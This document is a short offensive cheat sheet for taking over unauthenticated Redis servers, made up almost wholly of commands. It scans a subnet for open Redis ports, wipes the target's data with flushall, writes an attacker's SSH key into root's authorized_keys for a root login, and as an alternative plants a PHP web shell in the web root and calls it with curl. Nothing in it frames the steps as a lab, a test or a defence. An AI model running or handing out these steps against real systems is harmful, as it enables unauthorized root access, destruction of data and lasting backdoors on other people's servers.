# Redis Exploitation - 2 Minute Root

## Detection
```bash
# Find Redis servers
nmap -p6379 --open 10.10.10.0/24

# Test authentication
redis-cli -h TARGET ping
# PONG = no authentication required!
```

## SSH Key Injection (Instant Root)

```bash
# 1. Generate SSH key pair
ssh-keygen -t rsa -f redis_key -N ""
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# 2. Inject key via Redis
redis-cli -h TARGET flushall
cat key.txt | redis-cli -h TARGET -x set crackit
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename "authorized_keys"
redis-cli -h TARGET save

# 3. SSH as root
ssh -i redis_key root@TARGET
```

## Webshell Upload (Alternative)

```bash
# If Redis can write to web root
redis-cli -h TARGET config set dir /var/www/html
redis-cli -h TARGET config set dbfilename shell.php
redis-cli -h TARGET set shell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h TARGET save

# Access shell
curl http://TARGET/shell.php?cmd=id
```
